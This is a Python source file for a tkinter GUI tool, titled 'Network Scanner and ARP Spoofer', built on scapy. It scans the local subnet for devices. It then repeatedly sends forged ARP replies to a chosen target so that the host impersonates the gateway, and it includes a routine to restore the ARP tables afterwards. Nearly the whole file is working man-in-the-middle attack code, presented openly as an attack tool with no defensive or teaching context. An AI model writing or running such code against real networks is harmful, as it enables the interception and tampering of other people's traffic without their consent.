import psutil
from scapy.all import ARP, Ether, srp, send
import socket
import time
import tkinter as tk
from tkinter import messagebox, Listbox, Scrollbar, Frame, Label, Button, Entry

def get_network_interfaces():
    interfaces = psutil.net_if_addrs()
    return interfaces

def get_ip_address(interface):
    addresses = psutil.net_if_addrs()[interface]
    for address in addresses:
        if address.family == socket.AF_INET:
            return address.address
    return None

def scan_network(ip_range):
    arp_request = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    result = srp(packet, timeout=2, verbose=False)[0]

    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    return clients

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for target IP: {target_ip}")
        return

    # Construct the ARP packet to spoof the target
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    send(arp_response, verbose=False)

def restore_arp(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        return

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op="is-at")
    send(arp_response, count=4, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    result = srp(packet, timeout=2, verbose=False)[0]

    if result:
        return result[0][1].hwsrc
    else:
        return None

def scan_button_click():
    selected_index = interface_listbox.curselection()
    if not selected_index:
        messagebox.showerror("Error", "Please select a network interface")
        return

    selected_interface = interface_listbox.get(selected_index)
    local_ip = get_ip_address(selected_interface)

    if local_ip is None:
        messagebox.showerror("Error", "Unable to get IP address for the selected interface.")
        return

    ip_range = '.'.join(local_ip.split('.')[:3]) + '.1/24'
    result_label.config(text=f"Scanning network: {ip_range}")

    devices = scan_network(ip_range)

    devices_listbox.delete(0, tk.END)
    for device in devices:
        devices_listbox.insert(tk.END, f"{device['ip']} - {device['mac']}")

def arp_spoof_button_click():
    target_ip = target_ip_entry.get()
    gateway_ip = gateway_ip_entry.get()

    if not target_ip or not gateway_ip:
        messagebox.showerror("Error", "Please enter both target and gateway IP addresses")
        return

    result_label.config(text=f"Starting ARP spoofing attack on target {target_ip} pretending to be {gateway_ip}")

    def arp_spoof_loop():
        while True:
            arp_spoof(target_ip, gateway_ip)
            time.sleep(2)

    try:
        arp_spoof_loop()
    except KeyboardInterrupt:
        print("ARP spoofing attack stopped. Restoring network...")
        restore_arp(target_ip, gateway_ip)
        print("Network restored.")
        result_label.config(text="Network restored")

app = tk.Tk()
app.title("Network Scanner and ARP Spoofer")

frame = Frame(app)
frame.pack(pady=10)

interface_label = Label(frame, text="Network Interfaces:")
interface_label.grid(row=0, column=0, padx=5, pady=5)

interface_listbox = Listbox(frame)
interface_listbox.grid(row=1, column=0, padx=5, pady=5)
interfaces = get_network_interfaces()

for interface in interfaces:
    interface_listbox.insert(tk.END, interface)

scan_button = Button(frame, text="Scan Network", command=scan_button_click)
scan_button.grid(row=2, column=0, padx=5, pady=5)

devices_frame = Frame(app)
devices_frame.pack(pady=10)

devices_label = Label(devices_frame, text="Devices:")
devices_label.grid(row=0, column=0, padx=5, pady=5)

devices_listbox = Listbox(devices_frame)
devices_listbox.grid(row=1, column=0, padx=5, pady=5)

target_ip_label = Label(devices_frame, text="Target IP:")
target_ip_label.grid(row=2, column=0, padx=5, pady=5)

target_ip_entry = Entry(devices_frame)
target_ip_entry.grid(row=2, column=1, padx=5, pady=5)

gateway_ip_label = Label(devices_frame, text="Gateway IP:")
gateway_ip_label.grid(row=3, column=0, padx=5, pady=5)

gateway_ip_entry = Entry(devices_frame)
gateway_ip_entry.grid(row=3, column=1, padx=5, pady=5)

arp_spoof_button = Button(devices_frame, text="Start ARP Spoofing", command=arp_spoof_button_click)
arp_spoof_button.grid(row=4, column=0, columnspan=2, padx=5, pady=5)

result_label = Label(app, text="")
result_label.pack(pady=10)

app.mainloop()
